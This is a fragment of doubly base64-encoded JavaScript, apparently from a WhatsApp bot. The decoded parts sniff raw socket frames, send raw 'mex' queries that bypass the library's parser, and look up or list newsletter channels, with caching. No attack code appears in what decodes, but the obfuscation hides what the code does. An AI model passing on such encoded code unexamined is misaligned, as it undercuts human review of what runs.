WW5sMFpYTTZJR0oxWmk1c1pXNW5kR2dnZlRzS2ZRb0tMeThnTFMwdExTMHRMUzB0TFNCeVlYY2dabkpoYldVZ2MyNXBabVpsY2pvZ2EyVmxjSE1nZEdobElHSnBibUZ5ZVNCdFpYZ2djbVZ3YkhrZ1pYWmxiaUIzYUdWdUlIUm9aU0JzYVdKeVlYSjVJR1poYVd4eklIUnZJSEJoY25ObElHbDBJQzB0TFMwdExTMHRMUzBLSUNCamIyNXpkQ0JtY21GdFpYTWdQU0JiWFRzS0lDQnNaWFFnYzNSdmNDQTlJQ2dwSUQwK0lIdDlPd29nSUhSeWVTQjdDaUFnSUNCamIyNXpkQ0IzY3lBOUlITnZZMnNnSmlZZ2MyOWpheTUzY3pzS0lDQWdJR2xtSUNoM2N5QW1KaUIwZVhCbGIyWWdkM011YjI0Z1BUMDlJQ0ptZFc1amRHbHZiaUlwSUhzS0lDQWdJQ0FnWTI5dWMzUWdiMjVHY21GdFpTQTlJQ2htS1NBOVBpQjdDaUFnSUNBZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnSUNBZ0lHbG1JQ2htSUNZbUlIUjVjR1Z2WmlCbUlEMDlQU0FpYjJKcVpXTjBJaUFtSmlCbUxuUmhaeUE5UFQwZ0ltbHhJaUFtSmlCQmNuSmhlUzVwYzBGeWNtRjVLR1l1WTI5dWRHVnVkQ2tnSmlZS0lDQWdJQ0FnSUNBZ0lDQWdJQ0JtTG1OdmJuUmxiblF1YzI5dFpTZ29ZeWtnUFQ0Z1l5QW1KaUJqTG5SaFp5QTlQVDBnSW5KbGMzVnNkQ0lnSmlZZ1l5NWpiMjUwWlc1MElDRTlJRzUxYkd3cEtTQjdDaUFnSUNBZ0lDQWdJQ0FnSUdaeVlXMWxjeTV3ZFhOb0tHWXBPd29nSUNBZ0lDQWdJQ0FnSUNCcFppQW9abkpoYldWekxteGxibWQwYUNBK0lETXdLU0JtY21GdFpYTXVjMmhwWm5Rb0tUc0tJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0I5SUdOaGRHTm9JSHQ5Q2lBZ0lDQWdJSDA3Q2lBZ0lDQWdJSGR6TG05dUtDSm1jbUZ0WlNJc0lHOXVSbkpoYldVcE93b2dJQ0FnSUNCemRHOXdJRDBnS0NrZ1BUNGdleUIwY25rZ2V5QW9kM011YjJabUlIeDhJSGR6TG5KbGJXOTJaVXhwYzNSbGJtVnlLUzVqWVd4c0tIZHpMQ0FpWm5KaGJXVWlMQ0J2YmtaeVlXMWxLVHNnZlNCallYUmphQ0I3ZlNCOU93b2dJQ0FnZlFvZ0lIMGdZMkYwWTJnZ2UzMEtJQ0J5WlhSMWNtNGdleUJtY21GdFpYTXNJSE4wYjNBZ2ZUc0tmUW9nSUdOdmJuTjBJR2xrY3lBOUlHNWxkeUJOWVhBb0tTd2diRzl2YzJVZ1BTQnVaWGNnVTJWMEtDazdDaUFnYkdWMElHNWhiV1ZJYVc1MElEMGdJaUk3Q2lBZ1ptOXlJQ2hqYjI1emRDQm1JRzltSUdaeVlXMWxjeWtnZXdvZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnWTI5dWMzUWdjbVZ6SUQwZ1ppNWpiMjUwWlc1MExtWnBibVFvS0dNcElEMCtJR01nSmlZZ1l5NTBZV2NnUFQwOUlDSnlaWE4xYkhRaUtUc0tJQ0FnSUNBZ1kyOXVjM1FnWW5WbUlEMGdZMmhPYjJSbFEyOXVkR1Z1ZEZSdlFuVm1abVZ5S0hKbGN5QW1KaUJ5WlhNdVkyOXVkR1Z1ZENrN0NpQWdJQ0FnSUdsbUlDZ2hZblZtS1NCamIyNTBhVzUxWlRzS0lDQWdJQ0FnWTI5dWMzUWdaQ0E5SUdOb1JHVmpiMlJsVUdGNWJHOWhaQ2hpZFdZcE93b2dJQ0FnSUNCa0xtTm9ZVzV1Wld4ekxtWnZja1ZoWTJnb0tHTXBJRDArSUhzZ1kyOXVjM1FnY0NBOUlHbGtjeTVuWlhRb1l5NXBaQ2s3SUdsbUlDZ2hjQ0I4ZkNBb0lYQXVibUZ0WlNBbUppQmpMbTVoYldVcEtTQnBaSE11YzJWMEtHTXVhV1FzSUdNcE95QjlLVHNLSUNBZ0lDQWdaQzVxYVdSekxtWnZja1ZoWTJnb0tHb3BJRDArSUhzZ2FXWWdLQ0ZwWkhNdWFHRnpLR29wS1NCcFpITXVjMlYwS0dvc0lIc2dhV1E2SUdvc0lHNWhiV1U2SUNJaUxDQnBiblpwZEdVNklDSWlMQ0J6ZFdKelkzSnBZbVZ5Y3pvZ01DQjlLVHNnZlNrN0NpQWdJQ0FnSUdRdWJHOXZjMlV1Wm05eVJXRmphQ2dvYWlrZ1BUNGdiRzl2YzJVdVlXUmtLR29wS1RzS0lDQWdJQ0FnYVdZZ0tHUXVibUZ0WlVocGJuUWdKaVlnSVc1aGJXVklhVzUwS1NCdVlXMWxTR2x1ZENBOUlHUXVibUZ0WlVocGJuUTdDaUFnSUNCOUlHTmhkR05vSUh0OUNpQWdmUW9nSUhKbGRIVnliaUI3SUdsa2N6b2dXeTR1TG1sa2N5NTJZV3gxWlhNb0tWMHNJR3h2YjNObE9pQmJMaTR1Ykc5dmMyVmRMQ0J1WVcxbFNHbHVkQ0I5T3dwOUNnb3ZMeUF0TFMwdExTMHRMUzB0SUhKaGR5QnRaWGdnY1hWbGNua2dLR0o1Y0dGemMyVnpJSFJvWlNCc2FXSnlZWEo1SjNNZ2MzUnlhV04wSUVwVFQwNGdjR0Z5YzJWeUtTQXRMUzB0TFMwdExTMHRDaUFnYVdZZ0tDRnpiMk5ySUh4OElIUjVjR1Z2WmlCemIyTnJMbkYxWlhKNUlDRTlQU0FpWm5WdVkzUnBiMjRpS1NCMGFISnZkeUJ1WlhjZ1JYSnliM0lvSW5KaGR5QnhkV1Z5ZVNCcGN5QnViM1FnWVhaaGFXeGhZbXhsSUNoemIyTnJMbkYxWlhKNUlHMXBjM05wYm1jcElpazdDaUFnWTI5dWMzUWdjbVZ6SUQwZ1lYZGhhWFFnWTJoWGFYUm9WR2x0Wlc5MWRDaHpiMk5yTG5GMVpYSjVLSHNLSUNBZ0lIUmhaem9nSW1seElpd0tJQ0FnSUdGMGRISnpPaUI3SUhSNWNHVTZJQ0puWlhRaUxDQjBiem9nSW5NdWQyaGhkSE5oY0hBdWJtVjBJaXdnZUcxc2JuTTZJQ0ozT20xbGVDSWdmU3dLSUNBZ0lHTnZiblJsYm5RNklGdDdJSFJoWnpvZ0luRjFaWEo1SWl3Z1lYUjBjbk02SUhzZ2NYVmxjbmxmYVdRNklIRjFaWEo1U1dRZ2ZTd2dZMjl1ZEdWdWREb2dRblZtWm1WeUxtWnliMjBvU2xOUFRpNXpkSEpwYm1kcFpua29leUIyWVhKcFlXSnNaWE1nZlNrc0lDSjFkR1k0SWlrZ2ZWMEtJQ0I5S1N3Z2RHbHRaVzkxZEUxekxDQWljbUYzSUcxbGVDQnhkV1Z5ZVNJcE93b2dJR052Ym5OMElHTm9hV3hrSUQwZ1FYSnlZWGt1YVhOQmNuSmhlU2h5WlhNZ0ppWWdjbVZ6TG1OdmJuUmxiblFwSUQ4Z2NtVnpMbU52Ym5SbGJuUXVabWx1WkNnb1l5a2dQVDRnWXlBbUppQmpMblJoWnlBOVBUMGdJbkpsYzNWc2RDSXBJRG9nYm5Wc2JEc0tJQ0JqYjI1emRDQmlkV1lnUFNCamFFNXZaR1ZEYjI1MFpXNTBWRzlDZFdabVpYSW9ZMmhwYkdRZ0ppWWdZMmhwYkdRdVkyOXVkR1Z1ZENrN0NpQWdhV1lnS0NGaWRXWXBJSFJvY205M0lHNWxkeUJGY25KdmNpZ2liV1Y0T2lCbGJYQjBlU0J5WlhOMWJIUWlLVHNLSUNCamIyNXpkQ0JrSUQwZ1kyaEVaV052WkdWUVlYbHNiMkZrS0dKMVppazdDaUFnYVdZZ0tHUXVhbk52YmlBbUppQkJjbkpoZVM1cGMwRnljbUY1S0dRdWFuTnZiaTVsY25KdmNuTXBJQ1ltSUdRdWFuTnZiaTVsY25KdmNuTXViR1Z1WjNSb0lDWW1JQ0ZrTG1Ob1lXNXVaV3h6TG14bGJtZDBhQ2tnZXdvZ0lDQWdZMjl1YzNRZ1pYSWdQU0JrTG1wemIyNHVaWEp5YjNKeld6QmRJSHg4SUh0OU93b2dJQ0FnZEdoeWIzY2dibVYzSUVWeWNtOXlLQT09","TG5SeWFXMG9LU2s3Q2lBZ2ZRb2dJSEpsZEhWeWJpQmtPd3A5Q2dvdkx5QXRMUzB0TFMwdExTMHRJR1p2Ykd4dmQyVmtJR05vWVc1dVpXeHpJQzB0TFMwdExTMHRMUzBLSUNCamIyNXpkQ0JoZEhSbGJYQjBjeUE5SUZ0ZE93b2dJR052Ym5OMElHWnZkVzVrSUQwZ2JtVjNJRTFoY0NncE93b2dJR052Ym5OMElHRmtaQ0E5SUNoaGNuSXBJRDArSUhzS0lDQWdJR1p2Y2lBb1kyOXVjM1FnWlNCdlppQmhjbklnZkh3Z1cxMHBJSHNLSUNBZ0lDQWdhV1lnS0NGbElIeDhJQ0ZsTG1sa0tTQmpiMjUwYVc1MVpUc0tJQ0FnSUNBZ1kyOXVjM1FnY0NBOUlHWnZkVzVrTG1kbGRDaGxMbWxrS1RzS0lDQWdJQ0FnYVdZZ0tDRndLU0JtYjNWdVpDNXpaWFFvWlM1cFpDd2dleUF1TGk1bElIMHBPd29nSUNBZ0lDQmxiSE5sSUhzZ2FXWWdLQ0Z3TG01aGJXVWdKaVlnWlM1dVlXMWxLU0J3TG01aGJXVWdQU0JsTG01aGJXVTdJR2xtSUNnaGNDNXBiblpwZEdVZ0ppWWdaUzVwYm5acGRHVXBJSEF1YVc1MmFYUmxJRDBnWlM1cGJuWnBkR1U3SUdsbUlDZ2hjQzV6ZFdKelkzSnBZbVZ5Y3lBbUppQmxMbk4xWW5OamNtbGlaWEp6S1NCd0xuTjFZbk5qY21saVpYSnpJRDBnWlM1emRXSnpZM0pwWW1WeWN6c2dmUW9nSUNBZ2ZRb2dJSDA3Q2lBZ1kyOXVjM1FnYzI1cFptWmxjaUE5SUdOb1UzUmhjblJUYm1sbVptVnlLSE52WTJzcE93b2dJR3hsZENCemIzVnlZMlVnUFNBaWJtOXVaU0k3Q2lBZ2JHVjBJR3hwZG1WUGF5QTlJR1poYkhObE93b2dJSFJ5ZVNCN0NpQWdJQ0F2THlBeEtTQnNhV0p5WVhKNUlHWjFibU4wYVc5dWN3b2dJQ0FnWm05eUlDaGpiMjV6ZENCbWJpQnZaaUJiSW01bGQzTnNaWFIwWlhKVGRXSnpZM0pwWW1Wa0lpd2dJbTVsZDNOc1pYUjBaWEpHWlhSamFFRnNiRkJoY25ScFkybHdZWFJwYm1jaVhTa2dld29nSUNBZ0lDQnBaaUFvZEhsd1pXOW1JSE52WTJ0YlptNWRJQ0U5UFNBaVpuVnVZM1JwYjI0aUtTQmpiMjUwYVc1MVpUc0tJQ0FnSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmtZWFJoSUQwZ1lYZGhhWFFnWTJoWGFYUm9WR2x0Wlc5MWRDaHpiMk5yVzJadVhTZ3BMQ0F5TURBd01Dd2dabTRwT3dvZ0lDQWdJQ0FnSUdOdmJuTjBJR0Z5Y2lBOUlHTm9SR1ZsY0VOdmJHeGxZM1FvWkdGMFlTazdDaUFnSUNBZ0lDQWdZV1JrS0dGeWNpazdDaUFnSUNBZ0lDQWdZWFIwWlcxd2RITXVjSFZ6YUNoN0lITjBaWEE2SUNKc2FXSnlZWEo1SUd4cGMzUWlMQ0J2YXpvZ2RISjFaU3dnYmpvZ1lYSnlMbXhsYm1kMGFDQjlLVHNLSUNBZ0lDQWdJQ0JzYVhabFQyc2dQU0IwY25WbE95QnpiM1Z5WTJVZ1BTQWliR2xpY21GeWVTSTdDaUFnSUNBZ0lDQWdZbkpsWVdzN0NpQWdJQ0FnSUgwZ1kyRjBZMmdnS0dVcElIc0tJQ0FnSUNBZ0lDQmhkSFJsYlhCMGN5NXdkWE5vS0hzZ2MzUmxjRG9nSW14cFluSmhjbmtnYkdsemRDSXNJRzlyT2lCbVlXeHpaU3dnWlhKeU9pQmphRVZ5Y2xSbGVIUW9aU2tzSUd0cGJtUTZJR05vUTJ4aGMzTnBabmtvWlNrZ2ZTazdDaUFnSUNBZ0lIMEtJQ0FnSUgwS0lDQWdJR052Ym5OMElHRm1kR1Z5VEdsaWNtRnllU0E5SUdOb1UyNXBabVpUZFcxdFlYSjVLSE51YVdabVpYSXVabkpoYldWektUc0tDaUFnSUNBdkx5QXlLU0J5WVhjZ2JXVjRJSEYxWlhKNUlDaHNhV0p5WVhKNUlIQmhjbk5sY2lCaWVYQmhjM05sWkNrS0lDQWdJR2xtSUNnaGJHbDJaVTlyS1NCN0NpQWdJQ0FnSUdadmNpQW9ZMjl1YzNRZ2NXbGtJRzltSUVOSVgwMUZXRjlUVlVKVFExSkpRa1ZFWDBsRVV5a2dld29nSUNBZ0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ0lDQmpiMjV6ZENCa0lEMGdZWGRoYVhRZ1kyaFNZWGROWlhnb2MyOWpheXdnY1dsa0xDQjdmU2s3Q2lBZ0lDQWdJQ0FnSUNCcFppQW9aQzVqYUdGdWJtVnNjeTVzWlc1bmRHZ2dmSHdnWkM1cWFXUnpMbXhsYm1kMGFDa2dld29nSUNBZ0lDQWdJQ0FnSUNCaFpHUW9aQzVqYUdGdWJtVnNjeTVzWlc1bmRHZ2dQeUJrTG1Ob1lXNXVaV3h6SURvZ1pDNXFhV1J6TG0xaGNDZ29hV1FwSUQwK0lDaDdJR2xrTENCdVlXMWxPaUFpSWl3Z2FXNTJhWFJsT2lBaUlpd2djM1ZpYzJOeWFXSmxjbk02SURBZ2ZTa3BLVHNLSUNBZ0lDQWdJQ0FnSUNBZ1lYUjBaVzF3ZEhNdWNIVnphQ2g3SUhOMFpYQTZJQ0p5WVhjZ2NYVmxjbmtpTENCdmF6b2dkSEoxWlN3Z2Jqb2dabTkxYm1RdWMybDZaU0I5S1RzS0lDQWdJQ0FnSUNBZ0lDQWdiR2wyWlU5cklEMGdkSEoxWlRzZ2MyOTFjbU5sSUQwZ0luSmhkeUk3Q2lBZ0lDQWdJQ0FnSUNBZ0lHSnlaV0ZyT3dvZ0lDQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNBZ0lDQWdZWFIwWlcxd2RITXVjSFZ6YUNoN0lITjBaWEE2SUNKeVlYY2djWFZsY25raUxDQnZhem9nWm1Gc2MyVXNJR1Z5Y2pvZ0ltVnRjSFI1SUhKbGNHeDVJaXdnYTJsdVpEb2dJbTV2ZEdadmRXNWtJaUI5S1RzS0lDQWdJQ0FnSUNCOUlHTmhkR05vSUNobEtTQjdDaUFnSUNBZ0lDQWdJQ0JoZEhSbGJYQjBjeTV3ZFhOb0tIc2djM1JsY0RvZ0luSmhkeUJ4ZFdWeWVTSXNJRzlyT2lCbVlXeHpaU3dnWlhKeU9pQmphRVZ5Y2xSbGVIUW9aU2tzSUd0cGJtUTZJR05vUTJ4aGMzTnBabmtvWlNrZ2ZTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ0lDQjlDaUFnSUNCOUNnb2dJQ0FnTHk4Z015a2dhV1J6SUhKbFkyOTJaWEpsWkNCbWNtOXRJSFJvWlNCeVlYY2dZbWx1WVhKNUlISmxjR3g1SUhSb1pTQnNhV0p5WVhKNUlHTm9iMnRsWkNCdmJnb2dJQ0FnYVdZZ0tDRm1iM1Z1WkM1emFYcGxJQ1ltSUNGc2FYWmxUMnNwSUhzS0lDQWdJQ0FnWTI5dWMzUWdhV1J6SUQwZ1lXWjBaWEpNYVdKeVlYSjVMbWxrY3k1c1pXNW5kR2dnUHlCaFpuUmxja3hwWW5KaGNua3VhV1J6SURvZ1lXWjBaWEpNYVdKeVlYSjVMbXh2YjNObExtMWhjQ2dvYVdRcElEMCtJQ2g3SUdsa0xDQnVZVzFsT2lBaUlpd2dhVzUyYVhSbE9pQWlJaXdnYzNWaWMyTnlhV0psY25NNklEQWdmU2twT3dvZ0lDQWdJQ0JwWmlBb2FXUnpMbXhsYm1kMGFDa2dld29nSUNBZ0lDQWdJR0ZrWkNocFpITXBPd29nSUNBZ0lDQWdJSE52ZFhKalpTQTlJQ0p6Ym1sbVptVmtJanNLSUNBZ0lDQWdJQ0JoZEhSbGJYQjBjeTV3ZFhOb0tIc2djM1JsY0RvZ0luSmhkeUJ5WlhCc2VTQnpZMkZ1SWl3Z2IyczZJSFJ5ZFdVc0lHNDZJR2xrY3k1c1pXNW5kR2dnZlNrN0NpQWdJQ0FnSUgwZ1pXeHpaU0I3Q2lBZ0lDQWdJQ0FnWVhSMFpXMXdkSE11Y0hWemFDaDdJSE4wWlhBNklDSnlZWGNnY21Wd2JIa2djMk5oYmlJc0lHOXJPaUJtWVd4elpTd2daWEp5T2lBaWJtOGdTa2xFY3lCcGJpQnlZWGNnY21Wd2JIa2lMQ0JyYVc1a09pQWlibTkwWm05MWJtUWlJSDBwT3dvZ0lDQWdJQ0I5Q2lBZ0lDQjlDZ29nSUNBZ0x5OGdOQ2tnWTJoaGJtNWxiSE1nZEdocGN5QmliM1FnWVd4eVpXRmtlU0J5WlhOdmJIWmxaQ0F2SUhOaGR5QmlaV1p2Y21VZ0tHNWhiV1Z6SUNzZ1NrbEVjeWtLSUNBZ0lHbG1JQ2doWm05MWJtUXVjMmw2WlNBbUppQWhiR2wyWlU5cktTQjdDaUFnSUNBZ0lHTnZibk4wSUdOaFkyaGxJRDBnWTJoRFlXTm9aVXh2WVdRb2MyOWpheWs3Q2lBZ0lDQWdJR052Ym5OMElHTmhZMmhsWkNBOUlFOWlhbVZqZEM1bGJuUnlhV1Z6S0dOaFkyaGxMbUo1U21sa0tTNXRZWEFvS0Z0cFpDd2dkbDBwSUQwK0lDaDdJR2xrTENCdVlXMWxPaUIyTG01aGJXVWdmSHdnSWlJc0lHbHVkbWwwWlRvZ2RpNWpiMlJsSUh4OElDSWlMQ0J6ZFdKelkzSnBZbVZ5Y3pvZ01DQjlLU2s3Q2lBZ0lDQWdJR1p2Y2lBb1kyOXVjM1FnVzJsa0xDQnVZVzFsWFNCdlppQmphR0Z1Ym1Wc1RtRnRaVU5oWTJobExtVnVkSEpwWlhNb0tTa2dhV1lnS0NGallXTm9aUzVpZVVwcFpGdHBaRjBwSUdOaFkyaGxaQzV3ZFhOb0tIc2dhV1FzSUc1aGJXVXNJR2x1ZG1sMFpUb2dJaUlzSUhOMVluTmpjbWxpWlhKek9pQXdJSDBwT3dvZ0lDQWdJQ0JwWmlBb1kyRmphR1ZrTG14bGJtZDBhQ2tnZXdvZ0lDQWdJQ0FnSUdGa1pDaGpZV05vWldRcE93b2dJQ0FnSUNBZ0lITnZkWEpqWlNBOUlDSmpZV05vWlNJN0NpQWdJQ0FnSUNBZ1lYUjBaVzF3ZEhNdWNIVnphQ2g3SUhOMFpYQTZJQ0p6WVhabFpDQmpZV05vWlNJc0lHOXJPaUIwY25WbExDQnVPaUJqWVdOb1pXUXViR1Z1WjNSb0lIMHBPd29nSUNBZ0lDQjlJR1ZzYzJVZ2V3b2dJQ0FnSUNBZ0lHRjBkR1Z0Y0hSekxuQjFjMmdvZXlCemRHVndPaUFpYzJGMlpXUWdZMkZqYUdVaUxDQnZhem9nWm1Gc2MyVXNJR1Z5Y2pvZ0ltNXZkR2hwYm1jZ2MyRjJaV1FnZVdWMElpd2dhMmx1WkRvZ0ltNXZkR1p2ZFc1a0lpQjlLVHNLSUNBZ0lDQWdmUW9nSUNBZ2ZRb2dJSDBnWm1sdVlXeHNlU0I3Q2lBZ0lDQnpibWxtWm1WeUxuTjBiM0FvS1RzS0lDQjlDZ29nSUdOdmJuTjBJR3hwYzNRZ1BTQmJMaTR1Wm05MWJtUXVkbUZzZFdWektDbGRMbTFoY0Nnb1pTa2dQVDRnS0hzS0lDQWdJQzR1TG1Vc0NpQWdJQ0J1WVcxbE9pQmxMbTVoYldVZ2ZId2dZMmhPWVcxbFJuSnZiVU5oWTJobEtITnZZMnNzSUdVdWFXUXBJSHg4SUNKVmJtdHViM2R1SUVOb1lXNXVaV3dpQ2lBZ2ZTa3BPd29nSUd4cGMzUXVjMjl5ZENnb1lTd2dZaWtnUFQ0Z1lTNXVZVzFsTG14dlkyRnNaVU52YlhCaGNtVW9ZaTV1WVcxbEtTazdDaUFnYVdZZ0tITnZkWEpqWlNBOVBUMGdJbXhwWW5KaGNua2lJSHg4SUhOdmRYSmpaU0E5UFQwZ0luSmhkeUlwSUhzS0lDQWdJR1p2Y2lBb1kyOXVjM1FnWlNCdlppQnNhWE4wS1NCamFFTmhZMmhsVTJGMlpTaHpiMk5yTENCN0lHcHBaRG9nWlM1cFpDd2dibUZ0WlRvZ1pTNXVZVzFsSUQwOVBTQWlWVzVyYm05M2JpQkRhR0Z1Ym1Wc0lpQS9JQ0lpSURvZ1pTNXVZVzFsTENCamIyUmxPaUJsTG1sdWRtbDBaU0I5S1RzS0lDQjlDaUFnY21WMGRYSnVJSHNnYkdsemRDd2dZWFIwWlcxd2RITXNJSE52ZFhKalpTd2diR2wyWlU5cklIMDdDbjBLQ2k4dklDMHRMUzB0TFMwdExTMGdjMmx1WjJ4bElHTm9ZVzV1Wld3Z2JHOXZhM1Z3SUMwdExTMHRMUzB0TFMwS0lDQnBibkIxZERvZ0lrcEpSQ0I1YjNVZ2NISnZkbWxrWldRaUxBb2dJR1p2Y25kaGNtUmxaRG9nSW1admNuZGhjbVJsWkNCamFHRnVibVZzSUhCdmMzUWdLRzV2SUd4dmIydDFjQ0J1WldWa1pXUXBJaXdLSUNCallXTm9aVG9nSW5OaGRtVmtJR05oWTJobElpd0tJQ0JzYVdKeVlYSjVPaUFpVjJoaGRITkJjSEFnYkc5dmEzVndJaXdLSUNCeVlYYzZJQ0pYYUdGMGMwRndjQ0JzYjI5cmRYQWdLSEpoZHlCeGRXVnllU2tpTEFvZ0lHWnZiR3h2ZDJWa09pQWllVzkxY2lCbWIyeHNiM2RsWkNCamFHRnVibVZzY3lCc2FYTjBJaXdLSUNCemJtbG1abVZrT2lBaWNtRjNJRmRvWVhSelFYQndJSEpsY0d4NUlDaHlaV052ZG1WeVpXUXBJZ3A5T3dvZ0lHTnZibk4wSUdGMGRHVnRjSFJ6SUQwZ1cxMDdDaUFnWTI5dWMzUWdaRzl1WlNBOUlDaHZLU0E5UGlCN0NpQWdJQ0JqYUVOaFkyaGxVMkYyWlNoemIyTnJMQ0I3SUdwcFpEb2dieTVxYVdRc0lHNWhiV1U2SUc4dWJtRnRaU3dnWTI5a1pUb2dieTVwYm5acGRHVWdmSHdnWTI5a1pTQjlLVHNLSUNBZ0lISmxkSFZ5YmlCN0lHRjBkR1Z0Y0hSekxDQmpiMlJsTENCemRXSnpZM0pwWW1WeWN6b2dNQ3dnYVc1MmFYUmxPaUFpSWl3Z1kyOXVabWxrWlc1alpUb2dJbVY0WVdOMElpd2dibTkwWlRvZ0lpSXNJQzR1TG04c0lITnZkWEpqWlV4aFltVnNPaUJEU0Y5VFQxVlNRMFZmVEVGQ1JVeGJieTV6YjNWeVkyVmRJSHg4SUc4dWMyOTFjbU5sSUgwN0NpQWdmVHNLQ2lBZ0x5OGdRU2tnU2tsRUlHRnNjbVZoWkhrZ2EyNXZkMjRnS0hSNWNHVmtJR0o1SUhWelpYSXNJRzl5SUhSaGEyVnVJR1p5YjIwZ1lTQm1iM0ozWVhKa1pXUWdjRzl6ZENrZzRvQ1VJR3AxYzNRZ2RISjVJSFJ2SUdGa1pDQmhJRzVoYldVS0lDQnBaaUFvYW1sa0tTQjdDaUFnSUNCc1pYUWdibUZ0WlNBOUlHNWhiV1ZJYVc1MElIeDhJR05vVG1GdFpVWnliMjFEWVdOb1pTaHpiMk5yTENCcWFXUXBPd29nSUNBZ2JHVjBJRzFsZEdFZ1BTQnVkV3hzT3dvZ0lDQWdhV1lnS0NGdVlXMWxJQ1ltSUhSNWNHVnZaaUJ6YjJOckxtNWxkM05zWlhSMFpYSk5aWFJoWkdGMFlTQTlQVDBnSW1aMWJtTjBhVzl1SWlrZ2V3b2dJQ0FnSUNCMGNua2dld29nSUNBZ0lDQWdJRzFsZEdFZ1BTQmphRVJsWlhCRGIyeHNaV04wS0dGM1lXbDBJR05vVjJsMGFGUnBiV1Z2ZFhRb2MyOWpheTV1WlhkemJHVjBkR1Z5VFdWMFlXUmhkR0VvSW1wcFpDSXNJR3BwWkNrc0lERXlNREF3TENBaWJtRnRaU0JzYjI5cmRYQWlLU2xiTUYwZ2ZId2diblZzYkRzS0lDQWdJQ0FnSUNCdVlXMWxJRDBnS0cxbGRHRWdKaVlnYldWMFlTNXVZVzFsS1NCOGZDQWlJanNLSUNBZ0lDQWdmU0JqWVhSamFDQW9aU2tnZXdvZ0lDQWdJQ0FnSUdGMGRHVnRjSFJ6TG5CMWMyZ29leUJ6ZEdWd09pQWlibUZ0WlNCc2IyOXJkWEFpTENCdmF6b2dabUZzYzJVc0lHVnljam9nWTJoRmNuSlVaWGgwS0dVcExDQnJhVzVrT2lCamFFTnNZWE56YVdaNUtHVXBJSDBwT3dvZ0lDQWdJQ0I5Q2lBZ0lDQjlDaUFnSUNCeVpYUjFjbTRnWkc5dVpTaDdJR3BwWkN3Z2JtRnRaU3dnYzNWaWMyTnlhV0psY25NNklHMWxkR0UvTG5OMVluTmpjbWxpWlhKeklIeDhJREFzSUdsdWRtbDBaVG9nYldWMFlUOHVhVzUyYVhSbElIeDhJQ0lpTENCemIzVnlZMlU2SUdwcFpGTnZkWEpqWlNCOUtUc0tJQ0I5Q2lBZ2FXWWdLQ0ZqYjJSbEtTQjBhSEp2ZHlCUFltcGxZM1F1WVhOemFXZHVLRzVsZHlCRmNuSnZjaWdpYm04Z1kyaGhibTVsYkNCc2FXNXJMQ0JqYjJSbElHOXlJRXBKUkNCbmFYWmxiaUlwTENCN0lHRjBkR1Z0Y0hSekxDQnJhVzVrT2lBaWIzUm9aWElpSUgwcE93b0tJQ0F2THlCQ0tTQmpZV05vWlNBb1NrbEVjeUJ1WlhabGNpQmphR0Z1WjJVZ1ptOXlJR0VnWTJoaGJtNWxiQ2tLSUNCMGNua2dld29nSUNBZ1kyOXVjM1FnWXlBOUlHTm9RMkZqYUdWTWIyRmtLSE52WTJzcExtSjVRMjlrWlZ0amIyUmxYVHNLSUNBZ0lHbG1JQ2hqSUNZbUlHTXVhbWxrSUNZbUlFUmhkR1V1Ym05M0tDa2dMU0FvWXk1MGN5QjhmQ0F3S1NBOElFTklYME5CUTBoRlgxUlVURjlOVXlrZ2V3b2dJQ0FnSUNCeVpYUjFjbTRnWkc5dVpTaDdJR3BwWkRvZ1l5NXFhV1FzSUc1aGJXVTZJR011Ym1GdFpTQjhmQ0FpSWl3Z2MyOTFjbU5sT2lBaVkyRmphR1VpSUgwcE93b2dJQ0FnZlFvZ0lIMGdZMkYwWTJnZ2UzMEtDaUFnWTI5dWMzUWdjMjVwWm1abGNpQTlJR05vVTNSaGNuUlRibWxtWm1WeUtITnZZMnNwT3dvZ0lHeGxkQ0JsY25KU1lYY2dQU0J1ZFd4c095QXZMeUJ5WVhjZ1lubDBaWE1nZEdobElDaHdZWFJqYUdWa0tTQnNhV0p5WVhKNUlHRjBkR0ZqYUdWeklIUnZJR2wwY3lCd1lYSnpaU0JsY25KdmNnb2dJSFJ5ZVNCN0NpQWdJQ0F2THlCREtTQnNhV0p5WVhKNUlHeHZiMnQxY0NBb2NtVjBjbmtnYjI1alpTQnZiaUIwY21GdWMybGxiblFnY0hKdllteGxiWE1wQ2lBZ0lDQnBaaUFvZEhsd1pXOW1JSE52WTJzdWJtVjNjMnhsZEhSbGNrMWxkR0ZrWVhSaElEMDlQU0FpWm5WdVkzUnBiMjRpS1NCN0NpQWdJQ0FnSUdadmNpQW9iR1YwSUdGMGRHVnRjSFFnUFNBeE95QmhkSFJsYlhCMElEdzlJREk3SUdGMGRHVnRjSFFyS3lrZ2V3b2dJQ0FnSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnSUNCamIyNXpkQ0J5WVhjZ1BTQmhkMkZwZENCamFGZHBkR2hVYVcxbGIzVjBLSE52WTJzdWJtVjNjMnhsZEhSbGNrMWxkR0ZrWVhSaEtDSnBiblpwZEdVaUxDQmpiMlJsS1N3Z01qQXdNREFzSUNKamFHRnVibVZzSUd4dmIydDFjQ0lwT3dvZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnWTJnZ1BTQmphRVJsWlhCRGIyeHNaV04wS0hKaGR5bGJNRjA3Q2lBZ0lDQWdJQ0FnSUNCcFppQW9JV05vS1NCMGFISnZkeUJ1WlhjZ1JYSnliM0lvSW1WdGNIUjVJSEpsYzNCdmJuTmxJQ2h1YnlCamFHRnVibVZzSUdsa0tTSXBPd29nSUNBZ0lDQWdJQ0FnWVhSMFpXMXdkSE11Y0hWemFDaDdJSE4wWlhBNklDSnNhV0p5WVhKNUlHeHZiMnQxY0NJc0lHOXJPaUIwY25WbElIMHBPd29nSUNBZ0lDQWdJQ0FnY21WMGRYSnVJR1J2Ym1Vb2V5QnFhV1E2SUdOb0xtbGtMQ0J1WVcxbE9pQmphQzV1WVcxbExDQnpkV0p6WTNKcFltVnljem9nWTJndWMzVmljMk55YVdKbGNuTXNJR2x1ZG1sMFpUb2dZMmd1YVc1MmFYUmxJSHg4SUdOdlpHVXNJSE52ZFhKalpUb2dJbXhwWW5KaGNua2lJSDBwT3dvZ0lDQWdJQ0FnSUgwZ1kyRjBZMmdnS0dVcElIc0tJQ0FnSUNBZ0lDQWdJR052Ym5OMElHdHBibVFnUFNCa